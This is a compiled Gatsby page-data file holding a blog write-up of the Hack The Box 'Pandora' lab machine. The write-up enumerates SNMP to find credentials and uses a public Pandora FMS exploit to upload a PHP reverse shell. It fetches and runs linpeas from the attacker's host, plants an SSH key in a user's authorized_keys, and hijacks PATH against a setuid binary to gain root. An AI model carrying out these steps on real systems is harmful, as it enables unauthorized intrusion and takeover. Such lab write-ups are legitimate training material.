{
    "componentChunkName": "component---node-modules-lekoarts-gatsby-theme-minimal-blog-core-src-templates-post-query-tsx",
    "path": "/hack-the-box-pandora-writeup",
    "result": {"data":{"post":{"slug":"/hack-the-box-pandora-writeup","title":"Hack the Box Pandora Writeup","date":"07.03.2022","tags":[{"name":"Pandora, Snmp, Reverse-Shell, Privelege Escalation","slug":"pandora-snmp-reverse-shell-privelege-escalation"}],"description":null,"canonicalUrl":null,"body":"var _excluded = [\"components\"];\n\nfunction _extends() { _extends = Object.assign || function (target) { for (var i = 1; i < arguments.length; i++) { var source = arguments[i]; for (var key in source) { if (Object.prototype.hasOwnProperty.call(source, key)) { target[key] = source[key]; } } } return target; }; return _extends.apply(this, arguments); }\n\nfunction _objectWithoutProperties(source, excluded) { if (source == null) return {}; var target = _objectWithoutPropertiesLoose(source, excluded); var key, i; if (Object.getOwnPropertySymbols) { var sourceSymbolKeys = Object.getOwnPropertySymbols(source); for (i = 0; i < sourceSymbolKeys.length; i++) { key = sourceSymbolKeys[i]; if (excluded.indexOf(key) >= 0) continue; if (!Object.prototype.propertyIsEnumerable.call(source, key)) continue; target[key] = source[key]; } } return target; }\n\nfunction _objectWithoutPropertiesLoose(source, excluded) { if (source == null) return {}; var target = {}; var sourceKeys = Object.keys(source); var key, i; for (i = 0; i < sourceKeys.length; i++) { key = sourceKeys[i]; if (excluded.indexOf(key) >= 0) continue; target[key] = source[key]; } return target; }\n\n/* @jsxRuntime classic */\n\n/* @jsx mdx */\nvar _frontmatter = {\n  \"title\": \"Hack the Box Pandora Writeup\",\n  \"date\": \"2022-03-07T00:00:00.000Z\",\n  \"tags\": [\"Pandora, Snmp, Reverse-Shell, Privelege Escalation\"]\n};\nvar layoutProps = {\n  _frontmatter: _frontmatter\n};\nvar MDXLayout = \"wrapper\";\nreturn function MDXContent(_ref) {\n  var components = _ref.components,\n      props = _objectWithoutProperties(_ref, _excluded);\n\n  return mdx(MDXLayout, _extends({}, layoutProps, props, {\n    components: components,\n    mdxType: \"MDXLayout\"\n  }), mdx(\"p\", null, \"This is my writeup on Hackthebox \", mdx(\"strong\", {\n    parentName: \"p\"\n  }, \"Easy\"), \" machine, Pandora. This was a bit hard machine than other easy machines because it involved double privelege escalation and I had to deal with some new services and techniques which atleast I didn't know in detail.\"), mdx(\"p\", null, \"As always I started with scanning the target machine with \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"Nmap\"), \" and found the ssh and http port open.\\n\", mdx(\"span\", {\n    parentName: \"p\",\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"828px\"\n    }\n  }, \"\\n      \", mdx(\"span\", {\n    parentName: \"span\",\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"28.333333333333332%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAIAAABM9SnKAAAACXBIWXMAAAsTAAALEwEAmpwYAAABBUlEQVQY02XO2W6DMBAFUP6nYbGdAF7xbpwYA0mapFKl/v9fVJSqL5XOy4zuaG6RWv5eta5mVM1M+A6rtldl3deA1IA0kO5+Rlw1fVn/qhpcDGHW55s0k3WT9TnE1Y+LsQlT0/ZSyJEPgXLHh0CYhYiX1Xa2K7yffZjj5WrcFOKqbSLMEubgke+Jv1f/FX5c8vLK83O5fuTl+Xh9SX0mzGqbAKINZBAxgNjxJACiALEGUnQSAFKAaOHjGuLqQqbcaZtu908/ztZn67Nx05Qf43llwgsZO6wxtT0xfAgdVj3RhTIXoaIYAuNe6YuQUaq4LeWoTdrYNKhYNfitbA/V1vZQdXvtb0EjVtXL+iWpAAAAAElFTkSuQmCC')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  }), \"\\n  \", mdx(\"img\", {\n    parentName: \"span\",\n    \"className\": \"gatsby-resp-image-image\",\n    \"alt\": \"nmap scan\",\n    \"title\": \"nmap scan\",\n    \"src\": \"/blogs/static/4cc07e2496cf4b80c0e644e15962f986/aaaf2/scan.png\",\n    \"srcSet\": [\"/blogs/static/4cc07e2496cf4b80c0e644e15962f986/5243c/scan.png 240w\", \"/blogs/static/4cc07e2496cf4b80c0e644e15962f986/ab158/scan.png 480w\", \"/blogs/static/4cc07e2496cf4b80c0e644e15962f986/aaaf2/scan.png 828w\"],\n    \"sizes\": \"(max-width: 828px) 100vw, 828px\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    },\n    \"loading\": \"lazy\",\n    \"decoding\": \"async\"\n  }), \"\\n    \"), \"\\nOn opening the website, it was a simple html page, with no link working or any connection with server. So I decided to ignore this.\\nNext, I tried some default logins on ssh port, but no success there too. This led me to conclude that there must be other service running on this machine, which Nmap couldn't discover in first scan. I scanned again but this time top 20 ports on tcp but nothing.\"), mdx(\"p\", null, \"Then I did UDP scan on top 20 ports.\"), mdx(\"pre\", null, mdx(\"code\", {\n    parentName: \"pre\"\n  }, \"nmap -T4 -sV -sU --top-ports 20  10.10.11.136\\n\")), mdx(\"p\", null, \"This gave me the following output.\\n\", mdx(\"span\", {\n    parentName: \"p\",\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"847px\"\n    }\n  }, \"\\n      \", mdx(\"span\", {\n    parentName: \"span\",\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"74.58333333333333%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAIAAABr+ngCAAAACXBIWXMAAAsTAAALEwEAmpwYAAACGklEQVQoz4XR2W6jMACFYR5ligGbsOOVmN02Jm2SNoVm3v9NRpBOpelFR/qFfOFPoIOTJOOY1xoxGndRocOojtM+LYacKlxNWJiSG5jIRyBkABIXYheWblA69nRvp6Uxa6dvTXdW09IMr72+kaPN6FgKQ+Sc4j6nY0EHf8d7GPilw+Uc523JFBEmwz0WJio67yBcxIKoAog9+cSF9GkPIAYg3WSAQUCcZriGaZ2TQbYvUVYXdBynJSlaDzEhTxke3ZCBAwch9z4lBYgDJAASjjl9sKPN8WDmNc6akikzf8CoApBtIQZCDhD30I5385Vj5g+2vaHXdnUDEqW1bM8eYt4DhHufmH/Hg77J9pyTUdk1TGRa9nV/Dg7V47a/tx3Cre94NLe6u9BqUnZphqtsX5RdRvNeEvXLKwGkbkABZG5A99jTI8hdyB1l3pv+SivbqVcAaVp0aloIN2nR02rKyZATlRRdThQRllZzWg4pHjGfUjw6Zl6b/oK51naBB5EVnZnvsn2JszZMJIorFEsYbc8wqffzMYgkjOsgks78/LsdrlSY6XQnTDGh7eleUuV//Zhtdv45/t/c7bOFY+za9hdxtMauo34b9FvbX4JQgIB6kO2zs6+1/0048/NdT4s4TtO8Eq740XbDNSvabWTIfvYbNnat6pOxixeQJGvU9E658R/yR+9QrjFVlGnCVF52rJoKMviQ7v3H/wGLTbdFEKMgjAAAAABJRU5ErkJggg==')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  }), \"\\n  \", mdx(\"img\", {\n    parentName: \"span\",\n    \"className\": \"gatsby-resp-image-image\",\n    \"alt\": \"top ports udp scan\",\n    \"title\": \"top ports udp scan\",\n    \"src\": \"/blogs/static/76680e520722a718fd863f0387e2c7de/44c02/scan-top.png\",\n    \"srcSet\": [\"/blogs/static/76680e520722a718fd863f0387e2c7de/5243c/scan-top.png 240w\", \"/blogs/static/76680e520722a718fd863f0387e2c7de/ab158/scan-top.png 480w\", \"/blogs/static/76680e520722a718fd863f0387e2c7de/44c02/scan-top.png 847w\"],\n    \"sizes\": \"(max-width: 847px) 100vw, 847px\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    },\n    \"loading\": \"lazy\",\n    \"decoding\": \"async\"\n  }), \"\\n    \"), \"\\nSo we have the \", mdx(\"strong\", {\n    parentName: \"p\"\n  }, \"SNMP\"), \" service running on port 161. I had to read about this service a bit as I hadn't dealt with it before. I  read some standard enumerations of snmp and thought to use Metasploit for this as it has all the built-in scanners. I used snmp enumeration module.\"), mdx(\"pre\", null, mdx(\"code\", {\n    parentName: \"pre\"\n  }, \"msfconsole\\nuse auxiliary/scanner/snmp/snmp_enum\\nsetg RHOSTS 10.10.11.136\\nrun\\n\")), mdx(\"p\", null, \"On running, I got the a long output containing machine name, running processes and other information. On going through the output I found a set of credentials in running services.\\n\", mdx(\"span\", {\n    parentName: \"p\",\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"960px\"\n    }\n  }, \"\\n      \", mdx(\"span\", {\n    parentName: \"span\",\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"7.5%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAIAAADXZGvcAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAcElEQVQI1xXESw7CIBAA0J7EoKYBZkC+AwOkKSWu9P73Mb7F2xId4o4u9F168TSRjrk+1rHUEW3RmADzrgJYApOlTgqS1NG8ChjaqJ43AYUvhVk8kOq53t82lo+98MV9FZ7/67SOXWg+DhdaSENj/gFodRd0VpT17gAAAABJRU5ErkJggg==')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  }), \"\\n  \", mdx(\"img\", {\n    parentName: \"span\",\n    \"className\": \"gatsby-resp-image-image\",\n    \"alt\": \"snmp enumeration\",\n    \"title\": \"snmp enumeration\",\n    \"src\": \"/blogs/static/cd33d4bfc1209a6937b6feaa4887192c/7d769/snmp-enum.png\",\n    \"srcSet\": [\"/blogs/static/cd33d4bfc1209a6937b6feaa4887192c/5243c/snmp-enum.png 240w\", \"/blogs/static/cd33d4bfc1209a6937b6feaa4887192c/ab158/snmp-enum.png 480w\", \"/blogs/static/cd33d4bfc1209a6937b6feaa4887192c/7d769/snmp-enum.png 960w\", \"/blogs/static/cd33d4bfc1209a6937b6feaa4887192c/87339/snmp-enum.png 1440w\", \"/blogs/static/cd33d4bfc1209a6937b6feaa4887192c/0f8d0/snmp-enum.png 1726w\"],\n    \"sizes\": \"(max-width: 960px) 100vw, 960px\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    },\n    \"loading\": \"lazy\",\n    \"decoding\": \"async\"\n  }), \"\\n    \"), \"\\nI tried these credentials on ssh, and luckily I got in!!\\n\", mdx(\"span\", {\n    parentName: \"p\",\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"960px\"\n    }\n  }, \"\\n      \", mdx(\"span\", {\n    parentName: \"span\",\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"62.5%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAIAAAAmMtkJAAAACXBIWXMAAAsTAAALEwEAmpwYAAABdElEQVQoz42Si47TMBBF+yMItnk4fozfdvxM2jQtBSEk/v9nIO2qi4BlV7oajSwdzZ3r2S02r3nNhy91uoS0WD+FtPh4FCpiaik4EAFhvW+h6fgf2oV6qcdrLmsqa8wn46pQybiqTFYmE2YR1h2Sf5MbvJy+KZ25jKmsdbpM8+eYTxRc0/G2F/sW/jnzGbZ+YuCFisoUoaJxkxtnLgOm9jXmBU5lVSZ3SHIZQIwUXD/IDsl+UG/D168/tC0fPmJtK4gRYd10/Klh/3H7Ap8v3+fDlcvNsDaFcY+pJcy9a7L1k7FV26JtceMMIhBmGff9oPbtWzCIQMFzGUEEqbflP+3pe23fQvJbWrfACHMIq4GYx+ZPDftdj5cNHsNhjMdczyEtIS25nvOWf7knfzsyT5ij4Ahz90QoOAq+Q3InTJa2cBFABKGiVElsihTcQDTCeiDmXgeiMX30pu3FjtYjjwfn5w5JNGg0KIT17cOez+s1/bL9E/O0iryS5O8iAAAAAElFTkSuQmCC')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  }), \"\\n  \", mdx(\"img\", {\n    parentName: \"span\",\n    \"className\": \"gatsby-resp-image-image\",\n    \"alt\": \"daniel ssh login\",\n    \"title\": \"daniel ssh login\",\n    \"src\": \"/blogs/static/ff13af1eaae342e30b57256ceca121aa/7d769/ssh-daniel.png\",\n    \"srcSet\": [\"/blogs/static/ff13af1eaae342e30b57256ceca121aa/5243c/ssh-daniel.png 240w\", \"/blogs/static/ff13af1eaae342e30b57256ceca121aa/ab158/ssh-daniel.png 480w\", \"/blogs/static/ff13af1eaae342e30b57256ceca121aa/7d769/ssh-daniel.png 960w\", \"/blogs/static/ff13af1eaae342e30b57256ceca121aa/0f3cc/ssh-daniel.png 1228w\"],\n    \"sizes\": \"(max-width: 960px) 100vw, 960px\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    },\n    \"loading\": \"lazy\",\n    \"decoding\": \"async\"\n  }), \"\\n    \"), \"\\nAfter searching for flag file, I found that there is another user \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"matt\"), \" who owns the user flag file. So next task was to escalate privelege to matt user.\\n\", mdx(\"span\", {\n    parentName: \"p\",\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"696px\"\n    }\n  }, \"\\n      \", mdx(\"span\", {\n    parentName: \"span\",\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"65.41666666666667%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAIAAAAmMtkJAAAACXBIWXMAAAsTAAALEwEAmpwYAAAB1klEQVQoz42S246bMBRF+ZMmxNzMHdtcbAy2sSEBEpJJR6PptE/9/3+o2pGqVqOZVtqva29pnWOF5yW6bfHTY7iuuJurWhSYJ1ltg/jgJB/HgutzuNyj+wuczj6ZYHWrqfBhsT/8B+zN37zxHpxf4Hhx0OSWtxzxqlEwIv8ct9C6FNsluV4CJd1yOZRPHtlwY2CEd3b0MW9Vy1bOl/y4hlyG5RSUVxef81JVtcBljwj3IXqvwsrkmA4TWbZcmrxdiXwuus9tP7dcByF+xWzwznK33tp5Q/oUVCxEykeTX4wFkWFMHC+DEfEhctwUOAlw38BKnppGEtQWOeVcU9ozJgezNkzHac24wZV0IbFBsgex7STgNb+KLDNt0+kmhqWmykybHi+kFrTValhI1Qt56uTs9o9+9xCaLwCPWZRq7CsUxEFklbXIEYMRKTBn3DRswKTj/VizgVSCctPyse2OrDWYcC8obBDb4KcF20ms6XhlTGc5bdgwHjdt1l5Mp/lBDUvVyMGcxTAj/b3SX4ET7f/WbpXtgKiKEctIy7oT7eYo40ItSi9JVrNWl7WgTDVU/pb/x3tKE/SDbyYopIdHp7zv0pnJtWHq0w46XnZwEsfLgJu+PdUPkviddaXtiEAAAAAASUVORK5CYII=')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  }), \"\\n  \", mdx(\"img\", {\n    parentName: \"span\",\n    \"className\": \"gatsby-resp-image-image\",\n    \"alt\": \"daniellogin\",\n    \"title\": \"daniellogin\",\n    \"src\": \"/blogs/static/7c86c89aee4eb8b70f405f96e0346264/871fd/daniel.png\",\n    \"srcSet\": [\"/blogs/static/7c86c89aee4eb8b70f405f96e0346264/5243c/daniel.png 240w\", \"/blogs/static/7c86c89aee4eb8b70f405f96e0346264/ab158/daniel.png 480w\", \"/blogs/static/7c86c89aee4eb8b70f405f96e0346264/871fd/daniel.png 696w\"],\n    \"sizes\": \"(max-width: 696px) 100vw, 696px\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    },\n    \"loading\": \"lazy\",\n    \"decoding\": \"async\"\n  }), \"\\n    \"), \"\\nI decided to use Linpeas.sh(Linux privelege escalation awesome script) to look for path to privelge Escalation. You can get script \", mdx(\"a\", {\n    parentName: \"p\",\n    \"href\": \"https://github.com/carlospolop/PEASS-ng/releases/tag/20220306\"\n  }, \"here\"), \".\\nYou can also use Msf module \", mdx(\"a\", {\n    parentName: \"p\",\n    \"href\": \"https://github.com/carlospolop/PEASS-ng/tree/master/metasploit\"\n  }, \"PEASS\"), \" for using this script.\\nI uploaded the script on the target machine and ran it. I used python http.server module to upload file onto target machine.\"), mdx(\"pre\", null, mdx(\"code\", {\n    parentName: \"pre\"\n  }, \"python3 -m http.server 8002\\n\")), mdx(\"p\", null, \"Then on pandora, run the following commands:\"), mdx(\"pre\", null, mdx(\"code\", {\n    parentName: \"pre\"\n  }, \"wget http://10.10.16.43:8002/linpeas.sh\\nchmod +x linpeas.sh\\n./linpeas.sh\\n\")), mdx(\"p\", null, \"On going through the output, I found this information intersting. It looks there is another website hosted on localhost.localdomain.\"), mdx(\"p\", null, mdx(\"span\", {\n    parentName: \"p\",\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"744px\"\n    }\n  }, \"\\n      \", mdx(\"span\", {\n    parentName: \"span\",\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"40.416666666666664%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAIAAAB2/0i6AAAACXBIWXMAAAsTAAALEwEAmpwYAAAA9klEQVQY043Q/W6CMBQFcF5FSquMUsB+0t5SCkXUmW3x/R9mcSbLshhjcv67+eWc3KxsRyoPBQ0b5rEbtjASaUnviYJdmNCuzRHNi/pfEGYIsyxM5+P52rtkIcX5zKUXarCQuPTaRGXGvQBjozZR6lGbKNRAmbr7rKx4WYmqllwOHQeEGSYN2baYNJg0xaPca2+441A3RurgIPmwOr80nZU69G6mTG8QRZg93HzD83JZ1o8pXdbT1+n9uqyfb1T8np8nkyrspZc6GDs5v/Ruxts2L17DHXc/zwh7DkINuo9k1/3d9gxrG2E4WEg9JGMnC6msxIv4G8pFWLzTQh++AAAAAElFTkSuQmCC')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  }), \"\\n  \", mdx(\"img\", {\n    parentName: \"span\",\n    \"className\": \"gatsby-resp-image-image\",\n    \"alt\": \"linpeasinfo\",\n    \"title\": \"linpeasinfo\",\n    \"src\": \"/blogs/static/528f1be7b024b4895c4d60a90a84d564/f2f9b/linpeas.png\",\n    \"srcSet\": [\"/blogs/static/528f1be7b024b4895c4d60a90a84d564/5243c/linpeas.png 240w\", \"/blogs/static/528f1be7b024b4895c4d60a90a84d564/ab158/linpeas.png 480w\", \"/blogs/static/528f1be7b024b4895c4d60a90a84d564/f2f9b/linpeas.png 744w\"],\n    \"sizes\": \"(max-width: 744px) 100vw, 744px\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    },\n    \"loading\": \"lazy\",\n    \"decoding\": \"async\"\n  }), \"\\n    \")), mdx(\"p\", null, \"Using ssh local port forwarding, I forwarded the port 80 of target machine to port 8081 of my attacking vm.\"), mdx(\"pre\", null, mdx(\"code\", {\n    parentName: \"pre\"\n  }, \"ssh -L 8081:localhost:80 daniel@10.10.11.136 \\n\")), mdx(\"p\", null, \"On opening \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"localhost:8081\"), \" in browser I got login page of Pandora FMS. On bottom of the page, I found the version of the service as v7.0. On searching \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"pandora fms 7.0 exploit\"), \" I found \", mdx(\"a\", {\n    parentName: \"p\",\n    \"href\": \"https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained\"\n  }, \"this\"), \" useful link.\"), mdx(\"p\", null, \"I searched for CVE-2021-32099 exploit on github and found \", mdx(\"a\", {\n    parentName: \"p\",\n    \"href\": \"https://github.com/ibnuuby/CVE-2021-32099\"\n  }, \"this\"), \". On entering the url in browser I got admin access. I uploaded \", mdx(\"a\", {\n    parentName: \"p\",\n    \"href\": \"https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985\"\n  }, \"php-reverse-shell\"), \" file on file manager. Also on visiting the pandora_console folder on the machine (/var/www/pandora/pandora_console) I saw images folder which had all the uploads.\\nOn opening the uploaded reverse shell file as\\n\", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"localhost:8081/pandora_console/images/php-reverse-shell\"), \" I got the shell :).\\nRun the following commands on the web shell to get user flag \"), mdx(\"pre\", null, mdx(\"code\", {\n    parentName: \"pre\"\n  }, \"echo \\\"<your public ssh key\\\" >> /home/matt/.ssh/authorized_keys\\n\")), mdx(\"p\", null, \"Now login into pandora as matt user.\"), mdx(\"pre\", null, mdx(\"code\", {\n    parentName: \"pre\"\n  }, \"ssh matt@10.10.11.136\\n\")), mdx(\"p\", null, \"Now we get the user flag !!\"), mdx(\"p\", null, \"For root flag, I ran \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"linpeas.sh\"), \" again on the machine and found an executable file \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"/usr/bin/pandora_backup\"), \" with executable permission for matt and setuid bit set for root. On running this file, the backup failed because it was using tar for which I didn't have permissions. So I resorted to path poisoning attack.\"), mdx(\"pre\", null, mdx(\"code\", {\n    parentName: \"pre\"\n  }, \"cd /home/matt\\necho \\\"/bin/bash\\\" >> tar\\nexport PATH=/home/matt:$PATH\\nchmod 777 tar\\n/usr/bin/pandora_backup\\n\")), mdx(\"p\", null, \"And finallyyy, you get elevated to root user.\"));\n}\n;\nMDXContent.isMDXComponent = true;","excerpt":"This is my writeup on Hackthebox  Easy  machine, Pandora. This was a bit hard machine than other easy machines because it involved doubleâ€¦","timeToRead":2,"banner":null}},"pageContext":{"slug":"/hack-the-box-pandora-writeup","formatString":"DD.MM.YYYY"}},
    "staticQueryHashes": ["2744905544","3090400250","318001574"]}